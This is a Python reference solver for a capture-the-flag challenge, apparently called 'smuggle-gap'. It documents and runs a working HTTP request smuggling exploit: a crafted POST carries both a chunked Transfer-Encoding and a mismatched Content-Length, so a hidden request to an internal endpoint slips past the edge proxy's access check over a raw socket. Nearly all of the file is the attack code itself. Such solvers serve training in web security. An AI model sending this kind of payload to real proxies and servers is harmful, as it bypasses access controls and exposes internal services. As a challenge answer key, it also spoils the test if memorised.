#!/usr/bin/env python3
"""Reference solver for smuggle-gap.

The edge frames a request body by Content-Length and does not understand
chunked transfer; the internal app prefers chunked transfer and ignores
Content-Length when it is present. We craft one payload that both tiers accept
differently:

  * To the EDGE it is a single `POST /submit` with a Content-Length-sized body.
    `/submit` is allowed, so the edge forwards the whole thing verbatim.
  * To the APP the `Transfer-Encoding: chunked` body is an EMPTY body (`0\\r\\n\\r\\n`),
    ending the first request early -- and the bytes the edge thought were "body"
    are parsed by the app as a SECOND request: `GET /internal/flag`.

The edge only ever authorised the request it could see (`/submit`), so the
hidden `/internal/flag` request runs on the internal app and returns the flag,
which the edge relays straight back to us.

We speak raw HTTP over a socket because no ordinary HTTP client will let us send
a Content-Length that deliberately disagrees with a chunked body.

Usage:
    python3 solve.py http://HOST:PORT
Only depends on the Python standard library.
"""
import re
import socket
import sys
import urllib.parse

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"


def build_payload():
    """Build the framing-gap payload and return the raw bytes to send.

    The smuggled request is placed inside what the edge treats as the body.
    Content-Length is computed to cover EXACTLY the chunked terminator plus the
    smuggled request, so the edge reads it all as one request's body.
    """
    smuggled = (
        b"GET /internal/flag HTTP/1.1\r\n"
        b"Host: internal\r\n"
        b"\r\n"
    )
    # Empty chunked body ("0\r\n\r\n") immediately followed by the smuggled
    # request. This whole blob is the edge-visible body of POST /submit.
    edge_body = b"0\r\n\r\n" + smuggled

    head = (
        b"POST /submit HTTP/1.1\r\n"
        b"Host: edge\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Content-Length: " + str(len(edge_body)).encode() + b"\r\n"
        b"\r\n"
    )
    return head + edge_body


def send(host, port, payload, idle=1.5):
    s = socket.create_connection((host, port), timeout=10)
    try:
        s.sendall(payload)
        s.settimeout(idle)
        data = b""
        while True:
            try:
                chunk = s.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        return data
    finally:
        s.close()


def main():
    u = urllib.parse.urlparse(TARGET)
    host = u.hostname or "localhost"
    port = u.port or (443 if u.scheme == "https" else 80)

    # Sanity: the direct route is blocked at the edge (this is what we bypass).
    direct = send(host, port,
                  b"GET /internal/flag HTTP/1.1\r\nHost: edge\r\n\r\n")
    print("[*] direct GET /internal/flag ->",
          direct.split(b"\r\n", 1)[0].decode("latin-1", "replace"))

    payload = build_payload()
    print("[*] sending framing-gap payload (edge sees one request, app sees two)")
    resp = send(host, port, payload)

    text = resp.decode("latin-1", "replace")
    # The edge relays BOTH app responses; the flag is in the second one.
    m = re.search(r"NCTF\{[^}]+\}", text)
    if m:
        print("[+] FLAG:", m.group(0))
        return 0
    print("[-] no flag in response; raw bytes follow:")
    print(text)
    return 1


if __name__ == "__main__":
    sys.exit(main())
